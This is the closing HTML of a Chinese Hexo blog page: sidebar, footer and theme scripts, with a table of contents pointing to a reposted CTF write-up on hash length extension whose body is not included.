class="toc-text">Repartition:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Salt"><span class="toc-number">1.0.0.20.</span> <span class="toc-text">Salt</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#先用python写了一个爆破，结果太慢了，有用c写了一个"><span class="toc-number">1.0.0.21.</span> <span class="toc-text">先用python写了一个爆破，结果太慢了，有用c写了一个</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#最后获取的flag为Congratulations,_flag_is_flag{ha5h_ex7ens1on_r0cks!}"><span class="toc-number">1.0.0.22.</span> <span class="toc-text">最后获取的flag为Congratulations, flag is flag{ha5h_ex7ens1on_r0cks!}</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#*作者：墨客，本文属FreeBuf原创奖励计划，未经许可禁止转载"><span class="toc-number">1.0.0.23.</span> <span class="toc-text">*作者：墨客，本文属FreeBuf原创奖励计划，未经许可禁止转载</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#我来评几句"><span class="toc-number">1.0.0.23.1.</span> <span class="toc-text">我来评几句</span></a></li></ol></li></ol></li></ol></li></ol></li></ol>
 
  </div>

<div id="asidepart">
<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
<aside class="clearfix">

  
<div class="categorieslist">
	<p class="asidetitle">分类</p>
		<ul>
		
		  
			<li><a href="/categories/transcribe/" title="transcribe">transcribe<sup>78</sup></a></li>
		  
		
		  
			<li><a href="/categories/日志/" title="日志">日志<sup>1</sup></a></li>
		  
		
		</ul>
</div>


  
<div class="tagslist">
	<p class="asidetitle">标签</p>
		<ul class="clearfix">
		
			
				<li><a href="/tags/Net/" title=".Net">.Net<sup>7</sup></a></li>
			
		
			
				<li><a href="/tags/JavaScript/" title="JavaScript">JavaScript<sup>5</sup></a></li>
			
		
			
				<li><a href="/tags/数据库/" title="数据库">数据库<sup>4</sup></a></li>
			
		
			
				<li><a href="/tags/技术/" title="技术">技术<sup>4</sup></a></li>
			
		
			
				<li><a href="/tags/Linux/" title="Linux">Linux<sup>4</sup></a></li>
			
		
			
				<li><a href="/tags/iOS开发/" title="iOS开发">iOS开发<sup>4</sup></a></li>
			
		
			
				<li><a href="/tags/算法/" title="算法">算法<sup>3</sup></a></li>
			
		
			
				<li><a href="/tags/安卓开发/" title="安卓开发">安卓开发<sup>3</sup></a></li>
			
		
			
				<li><a href="/tags/链表/" title="链表">链表<sup>3</sup></a></li>
			
		
			
				<li><a href="/tags/Oracle数据库/" title="Oracle数据库">Oracle数据库<sup>3</sup></a></li>
			
		
			
				<li><a href="/tags/MVC模式/" title="MVC模式">MVC模式<sup>3</sup></a></li>
			
		
			
				<li><a href="/tags/Html/" title="Html">Html<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/REST/" title="REST">REST<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/WCF/" title="WCF">WCF<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/Objective-C/" title="Objective-C">Objective-C<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/Docker/" title="Docker">Docker<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/Java/" title="Java">Java<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/性能优化/" title="性能优化">性能优化<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/移动开发/" title="移动开发">移动开发<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/加密解密/" title="加密解密">加密解密<sup>2</sup></a></li>
			
		
		</ul>
</div>


<div class="weiboshow">
	<p class="asidetitle">新浪微博</p>
	<iframe width="100%" height="550" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=550&fansRow=2&ptype=1&speed=0&skin=1&isTitle=1&noborder=1&isWeibo=1&isFans=1&uid=1289635200&verifier=e6bef170&dpc=1"></iframe>
</div>


  <div class="linkslist">
  <p class="asidetitle">友情链接</p>
    <ul>
        
          <li>
            
            	<a href="https://coderq.com" target="_blank" title="一个面向程序员交流分享的新一代社区">码农圈</a>
            
          </li>
        
          <li>
            
            	<a href="http://wuchong.me" target="_blank" title="Jark&#39;s Blog">Jark&#39;s Blog</a>
            
          </li>
        
    </ul>
</div>

  


  <div class="rsspart">
	<a href="/atom.xml" target="_blank" title="rss">RSS 订阅</a>
</div>

</aside>
</div>
    </div>
    <footer><div id="footer" >
	
	<div class="line">
		<span></span>
		<div class="author"></div>
	</div>
	
	
	<section class="info">
		<p> Hello ,I&#39;m Larry Page in Google. <br/>
			This is my blog,believe it or not.</p>
	</section>
	 
	<div class="social-font" class="clearfix">
		
		<a href="http://weibo.com/512316815" target="_blank" class="icon-weibo" title="微博"></a>
		
		
		<a href="https://github.com/sblig" target="_blank" class="icon-github" title="github"></a>
		
		
		
		
		
		
		
		
		
	</div>
			
		

		<p class="copyright">
		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/sblig" target="_blank" title="fblog">fblog</a> © 2015
		
		<a href="/about" target="_blank" title="edwin">edwin</a>
		
		
		</p>
</div>
</footer>
    <script src="/js/jquery-2.0.3.min.js"></script>
<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>

<script type="text/javascript">
$(document).ready(function(){ 
  $('.navbar').click(function(){
    $('header nav').toggleClass('shownav');
  });
  var myWidth = 0;
  function getSize(){
    if( typeof( window.innerWidth ) == 'number' ) {
      myWidth = window.innerWidth;
    } else if( document.documentElement && document.documentElement.clientWidth) {
      myWidth = document.documentElement.clientWidth;
    };
  };
  var m = $('#main'),
      a = $('#asidepart'),
      c = $('.closeaside'),
      o = $('.openaside');
  c.click(function(){
    a.addClass('fadeOut').css('display', 'none');
    o.css('display', 'block').addClass('fadeIn');
    m.addClass('moveMain');
  });
  o.click(function(){
    o.css('display', 'none').removeClass('beforeFadeIn');
    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
    m.removeClass('moveMain');
  });
  $(window).scroll(function(){
    o.css("top",Math.max(80,260-$(this).scrollTop()));
  });
  
  $(window).resize(function(){
    getSize(); 
    if (myWidth >= 1024) {
      $('header nav').removeClass('shownav');
    }else{
      m.removeClass('moveMain');
      a.css('display', 'block').removeClass('fadeOut');
      o.css('display', 'none');
      
      $('#toc.toc-aside').css('display', 'none');
        
    }
  });
});
</script>

<script type="text/javascript">
$(document).ready(function(){ 
  var ai = $('.article-content>iframe'),
      ae = $('.article-content>embed'),
      t  = $('#toc'),
      ta = $('#toc.toc-aside'),
      o  = $('.openaside'),
      c  = $('.closeaside');
  if(ai.length>0){
    ai.wrap('<div class="video-container" />');
  };
  if(ae.length>0){
   ae.wrap('<div class="video-container" />');
  };
  c.click(function(){
    ta.css('display', 'block').addClass('fadeIn');
  });
  o.click(function(){
    ta.css('display', 'none');
  });
  $(window).scroll(function(){
    ta.css("top",Math.max(140,320-$(this).scrollTop()));
  });
});
</script>


<script type="text/javascript">
$(document).ready(function(){ 
  var $this = $('.share'),
      url = $this.attr('data-url'),
      encodedUrl = encodeURIComponent(url),
      title = $this.attr('data-title'),
      tsina = $this.attr('data-tsina'),
      description = $this.attr('description');
  var html = [
  '<a href="#" class="overlay" id="qrcode"></a>',
  '<div class="qrcode clearfix"><span>扫描二维码分享到微信朋友圈</span><a class="qrclose" href="#nothing"></a><strong>Loading...Please wait</strong><img id="qrcode-pic" data-src="http://s.jiathis.com/qrcode.php?url=' + encodedUrl + '"/></div>',
  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
  '<span title="Share to"></span>'
  ].join('');
  $this.append(html);
  $('.article-share-qrcode').click(function(){
    var imgSrc = $('#qrcode-pic').attr('data-src');
    $('#qrcode-pic').attr('src', imgSrc);
    $('#qrcode-pic').load(function(){
        $('.qrcode strong').text(' ');
    });
  });
});     
</script>









<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
$(document).ready(function(){ 
  $('.article-content').each(function(i){
    $(this).find('img').each(function(){
      if ($(this).parent().hasClass('fancybox')) return;
      var alt = this.alt;
      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
    });
    $(this).find('.fancybox').each(function(){
      $(this).attr('rel', 'article' + i);
    });
  });
  if($.fancybox){
    $('.fancybox').fancybox();
  }
}); 
</script>



<!-- Analytics Begin -->





<!-- Analytics End -->

<!-- Totop Begin -->

	<div id="totop">
	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
	</div>
	<script src="/js/totop.js"></script>

<!-- Totop End -->

<!-- MathJax Begin -->
<!-- mathjax config similar to math.stackexchange -->


<!-- MathJax End -->

<!-- Tiny_search Begin -->

<!-- Tiny_search End -->

  </body>
</html>
